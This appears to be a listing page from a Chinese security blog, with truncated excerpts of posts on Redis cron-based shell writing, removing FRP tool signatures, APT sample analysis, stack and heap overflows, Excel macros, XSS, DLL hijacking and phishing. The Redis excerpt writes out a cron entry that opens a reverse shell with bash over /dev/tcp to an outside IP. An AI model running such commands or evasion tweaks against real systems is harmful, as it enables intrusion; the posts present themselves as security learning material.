首先卸载Postfix
如果没有Postfix就跳过
sudo systemctl stop postfixsudo apt remove postfix &amp;&amp; apt purge postfix
安装Sendmail
sudo apt install sendmail
配置Sendmail服务器
sudo sendmailconfig
接收输入电子邮件
编辑/etc/mail/sendmail.mc
DAEMON_OPTIONS(`Family=inet,  Name=MTA-v4, Port=smtp, Addr=127.0.0.1&#x27;)dnlDAEMON_OPTIONS(`Family=inet,  Name=MSP-v4, Port=submission, M=Ea, Addr=127.0.0.1&#x27;)dnl# ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/07/12/RedisWritesShell/" title="Redis写SHELL"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/129.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Redis写SHELL"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/12/RedisWritesShell/" title="Redis写SHELL">Redis写SHELL</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-12T15:07:46.000Z" title="发表于 2021-07-12 23:07:46">2021-07-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-07T10:53:30.676Z" title="更新于 2022-12-07 18:53:30">2022-12-07</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Redis/">Redis</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/SHELL/">SHELL</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

通过计划任务获取SHELL
首先进行连接
redis-cli -h 192.168.251.17 -p 6379
然后设置文件夹路径
config set dir /var/spool/cron/crontabs
如果出现(error) ERR Changing directory: Permission denied标明Redis并不是root权限启动的，权限不足，需要使用redis-server /etc/redis/redis.conf来启动程序，不能使用service redis start来启动
接着修改文件，Ubuntu的计划任务是在这个文件中
config set dbfilename root
设置计划任务，需要添加\n符号，因为写进去后会有很多无用数据
set -.- &quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.251.16/8899 0&g ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/07/09/FrequentToolCharacteristics/" title="常见工具特征去除"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/128.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="常见工具特征去除"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/07/09/FrequentToolCharacteristics/" title="常见工具特征去除">常见工具特征去除</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-07-09T15:07:46.000Z" title="发表于 2021-07-09 23:07:46">2021-07-09</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/">去除特征</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


FRP改造

改造之前


在受害者机器上使用frpc.exe -c frpc_socker.ini连接服务起的时候，会产生一个这种数据校检

流量改造

pkg\msg\msg.go
这几个函数中保存着上面的信息

我在前加个了前缀

而在pkg\util\version\version.go 中定义了版本信息，这里也可以修改一下

改成随便一个版本

结果如下


编译方式

首先执行make会进行一些GitHub的包下载（最好使用代理
接着执行make -f Makefile.cross-compiles进行编译


配置文件改造

全称只需要修改这个文件cmd/frpc/sub/root.go
先修改var位置，添加ip、port、fileContent这三个参数
var (	cfgFile     string	showVersion bool	serverAddr        string	user        ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/126.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/18/SampleAnalysis/0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0/" title="蔓灵花APT组织针对巴基斯坦定向攻击的样本分析">蔓灵花APT组织针对巴基斯坦定向攻击的样本分析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-18T15:45:42.000Z" title="发表于 2021-05-18 23:45:42">2021-05-18</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/">样本分析</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/APT/">APT</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

开个新坑，学习下样本分析看看有什么好的免杀技术能够让我整合的，第一篇文章就参考Crazyman师傅写文章的和网上各个沙箱的已有的内容


样本




文件类型
PE32 executable (console) Intel 80386, for MS Windows




文件大小
31KB


MD5
8d42c01180be7588a2a68ad96dd0cf85


SHA1
89a7861acb7983ad712ae9206131c96454a1b3d8


SHA256
0b2a794bac4bf650b6ba537137504162520b67266449be979679afbb14e8e5c0


时间戳
0x5C32FC2B (Mon Jan 07 15:13:47 2019)


PDB
c:\Users\Asterix\Documents\Visual Studio 2008\Projects\ ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/123.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux堆溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/05/04/HeapOverflow_Linux_0x01/" title="Linux堆溢出总结（0x01）">Linux堆溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-05-04T15:45:42.000Z" title="发表于 2021-05-04 23:45:42">2021-05-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.458Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%A0%86/">堆</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

HVV结束，终于能闲下来学习了，开新坑啦~好耶~


记个小知识点



libc是Linux下的ANSI C函数库。


glibc是Linux下的GUN C函数库。


Linux下原来的标准c库Linux libc逐渐不再被维护。Linux下面的标准c库不仅有这一个，如uclibc、klibc，以及上面被提到的Linux libc，但是glibc无疑是用得最多的。glibc在/lib目录下的.so文件为libc.so.6。
堆内存管理机制介绍
不同平台的堆内存管理机制不相同，下面是几个常见平台的堆内存管理机制：



平台
堆内存分配机制




General purpose allocator
dlmalloc


glibc
ptmalloc2


free BSD and Firefox
jemalloc


Google
tcmalloc


Solaris
libumem



在 Linux 的 g ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/122.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x03）"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/03/26/StackOverflow_Linux_0x03/" title="Linux栈溢出总结（0x03）">Linux栈溢出总结（0x03）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-26T10:45:42.000Z" title="发表于 2021-03-26 18:45:42">2021-03-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.436Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

上篇文章真的就是一改就花了一个月时间，然后发现篇幅有点太长了分割一下，感觉这篇也需要好久


记录

几个未填坑的点

如何计算出TLS的offset大小（EXP抄的，我也懵
SSP题目中，为什么当可执行文件足够小的时候，他的不同区段可能会被多次映射？


绕过PIE保护

测试代码（题目泄露地址）
//test.c#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;void vuln_func() &#123;	char buf[128];	read(STDIN_FILENO, buf, 256);&#125;int main(int argc, char *argv[]) &#123;	printf(&quot;%p\n&quot;,&amp;main);	vuln_func();	write(STDOUT_FILENO, &quot;Hello world!\n&qu ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/121.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Office Excel Macro"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/27/OfficeExcelMacro/" title="Office Excel Macro">Office Excel Macro</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-27T10:45:42.000Z" title="发表于 2021-01-27 18:45:42">2021-01-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.817Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/Excel%E5%AE%8F/">Excel宏</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

好久没笼统的学习了，梳理下Excel宏相关的东西以防下次要用的时候都不会。

关于宏
据我所知微软office所支持的宏里面，目前有两种

1992年：微软在office中引用了名为Excel4.0的宏代码技术，也被成为XLM宏。Excel4.0宏代码写在表格中，宏代码的具体文件呈现为xml而不是二进制文件。
1993年：微软更新了Excel5.0技术，也就是现在常见的VBA宏代码。

从Excel2010到Excel2019全线产品都支持Excel4.0宏。同时微软也提到，虽然目前Microsoft Excel仍然支持Excel4.0宏，但还是建议用户使用VBA宏。
Macro 4.0
简单利用
在箭头位置点击右键-&gt;插入即可使用

接着会出现一个新建的宏表格，我们在表格中添加如下命令，即可完成一个简单的宏
=EXEC(&quot;calc.exe&quot;)=ALERT(&quot;hello ascotb ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/120.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="从零开始编写XSS平台"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台">从零开始编写XSS平台</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-08T10:45:42.000Z" title="发表于 2021-01-08 18:45:42">2021-01-08</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.773Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XSS/">XSS</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

在我们日常渗透或者红队打点的时候都或多或少的会挖掘到XSS漏洞，由于红队钓鱼也经常用到XSS平台，虽然网上免费可以注册的平台很多，但是这些平台都是别人的首先钓鱼到的数据并不是只有你一个人可见，网站的管理员也可以看的到，这就会对某些敏感的红队项目的信息造成泄漏，其次网站也经常不稳定，尝尝十天半个月就要换一个平台重新来一次，所以这篇文章就来了~

项目地址：https://github.com/Ascotbe/Medusa


什么是XSS
跨站脚本（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。
Cross-site scripting的英文首字母缩写本应为CSS，但因为CSS在网页设计领域已经被广泛指层叠样式表（Cascading S ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/119.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux ELF格式解析"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/12/06/ExecutableLinkableFormat/" title="Linux ELF格式解析">Linux ELF格式解析</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-12-06T15:45:42.000Z" title="发表于 2020-12-06 23:45:42">2020-12-06</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/ELF/">ELF</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

在写PE结构解析的时候，以为ELF结构没必要去看文件结构，直到后面做了PWN题发现不是这样的，所有还是学习下ELF结构，然后再写个解析器

常见结构区分

目前，PC平台流行的可执行文件格式（Executable）主要包含如下两种，它们都是COFF（Common File Format）格式的变种

Windows下的PE（Portable Executable）
Linux下的ELF（Executable Linkable Format）

源代码经过编译后但未进行连接的那些中间文件（Windows的.obj和Linux的.o），它与可执行文件的格式非常相似，所以一般跟可执行文件格式一起采用同一种格式存储。
其中动态链接库（DDL，Dynamic Linking Library）和静态链接库（Static Linking Library）的格式都和当前系统对应的可执行文件结构一样

动态链接库：Windows的.dl ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/118.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x02）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/20/StackOverflow_Linux_0x02/" title="Linux栈溢出总结（0x02）">Linux栈溢出总结（0x02）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-20T10:45:42.000Z" title="发表于 2020-11-20 18:45:42">2020-11-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

在上篇中介绍了一些常见保护，以及如何开关，还有如何生成shellcode等操作，就那么点东西我搞了一星期，真是菜吐了，心态崩了了


写在前面的几个笔记

CALL和RET指令解释


CALL指令调用某个子函数时，下一条指令的地址作为返回地址被保存到栈中。等价于PUSH返回地址与JMP函数地址的指令序列
RET指令跳转到CALL指令保存的返回地址，讲控制权交还给调用函数。等价于POP返回地址与JMP返回地址的指令序列

AMD64和i386的区别

由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下

首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于0x00007fffffffffff，否则就会抛出异常。
其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在RDI、RSI、RDX、RCX、 R8和R9中，如果还有更多的参数的 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/117.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x01）"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/19/StackOverflow_Linux_0x01/" title="Linux栈溢出总结（0x01）">Linux栈溢出总结（0x01）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-19T10:45:42.000Z" title="发表于 2020-11-19 18:45:42">2020-11-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

记录下自己学习堆栈溢出的内容，这篇就是栈溢出入门的东西，也算是栈溢出总结的上篇，缝合怪文章大部分都是参考各个师傅的文章。写文章的初心是为了总结梳理下自己的学习过程。22年重新修改部分内容


栈溢出利用方式


ROP（修改返回地址，让其指向内存中已有的一段指令

ret2shellcode（修改返回地址，让其指向溢出数据中的一段指令
ret2libc（修改返回地址，让其指向内存中已有的某个函数
BROP
ret2dl-resolve
SROP




常用保护机制

CANNARY金丝雀(栈保护)/Stack protect/栈溢出保护
栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/11/13/DynamicLinkLibraryHijack/" title="恶意程序研究之DLL劫持"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/115.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="恶意程序研究之DLL劫持"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/13/DynamicLinkLibraryHijack/" title="恶意程序研究之DLL劫持">恶意程序研究之DLL劫持</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-13T07:45:42.000Z" title="发表于 2020-11-13 15:45:42">2020-11-13</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%9C%A8%E9%A9%AC/">木马</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/DLL%E5%8A%AB%E6%8C%81/">DLL劫持</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

DLL劫持
DLL劫持一直深受黑客们的喜欢，利用此技术可以实现启动木马后门，游戏外挂插件的注入，绕过UAC等操作。
全文约定：全文中系统盘所在的位置默认为C盘
DLL加载顺序
DLL是以文件的形式存在在硬盘中，那么应用程序又是如何索引所需的DLL呢？其实，Microsoft已在此处完整记录了DLL搜索顺序。

微软的DLL劫持分为三个阶段


无保护阶段：Windows XP SP2之前
保护阶段：Windows XP SP2之后，Windows 7之前
进一步保护阶段：Windows 7之后


Windows XP SP2之前


进程对应的应用程序所在目录；
加载 DLL 时所在的当前目录；
系统目录即 SYSTEM32 目录（通过 GetSystemDirectory 获取）；
16位系统目录即 SYSTEM 目录；
Windows目录（通过 GetWindowsDirectory 获取）；
PATH环境变量中的各个目录 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/11/02/WindowsTalk/" title="Windows杂谈"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/116.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Windows杂谈"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/11/02/WindowsTalk/" title="Windows杂谈">Windows杂谈</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-11-02T10:45:42.000Z" title="发表于 2020-11-02 18:45:42">2020-11-02</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.459Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Windows/">Windows</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

梳理Windows的历史

Windows杂谈
微软于1985年11月20日推出了名为Windows的操作系统，作为MS-DOS的图形操作系统外壳，而MacOS是1984年推出的。并且Windows 10是微软最后一个版本的操作系统，不在会有像Windows 7 和Windows 7 sp1 或者sp2这种升级，而是统一使用Windows 10 1507这样的编号。

Windows内核区别

MS-DOS

1980年，西雅图计算机产品公司的一名24岁的程序员Tim Paterson(蒂姆·帕特森)花费了四个月时间编写出了 86-DOS 操作系统。1981年7月，微软以五万美元的代价向西雅图公司购得本产品的全部著作权，并将它更名为 MS-DOS。
MS-DOS源码下载
https://computerhistory.org/blogs/microsoft-research-license-agreement-msdo ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/111.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="关于邮件钓鱼的哪些事"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/26/Office_0x01/" title="关于邮件钓鱼的哪些事">关于邮件钓鱼的哪些事</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-26T13:45:42.000Z" title="发表于 2020-07-26 21:45:42">2020-07-26</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

漏洞利用那一节放到下篇吧，复现环境有点难找
测试环境

kail-2019.4
windows7 sp1 x64
windows10 x64

Office宏
首先来区别下Word和Excel各种后缀中的区别
Word文档
97-2003的旧版本文件名后缀就是**.doc**
从2007版以后后缀名是**.docx**
docx厉害一点。它是被压缩过的文档，体积更小，能处理更加复杂的内容，访问速度更快。
如果把docx的改为zip的话可以解压出里面的所有数据，不过空文档大部分都是XM格式的文件
Excel表格
xls是一个特有的二进制格式，其核心结构是复合文档类型的结构，而xlsx的核心结构是XML类型的结构，采用的是基于XML的压缩方式，使其占用的空间更小。xlsx中最后一个x的意义就在于此。
xls是2003版本下的文件 ，不管有没有宏程序的话都是xls文件 ，从2007开始做了区分，xlsm文件和xlsx文件都是 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2020/07/24/XXE/" title="XXE的一些利用方式"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/110.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="XXE的一些利用方式"></a></div><div class="recent-post-info"><a class="article-title" href="/2020/07/24/XXE/" title="XXE的一些利用方式">XXE的一些利用方式</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-24T13:45:42.000Z" title="发表于 2020-07-24 21:45:42">2020-07-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/XXE/">XXE</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

对没错这是这星期的第四篇文章了，我感觉要肝不动了啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊啊

XXE是什么
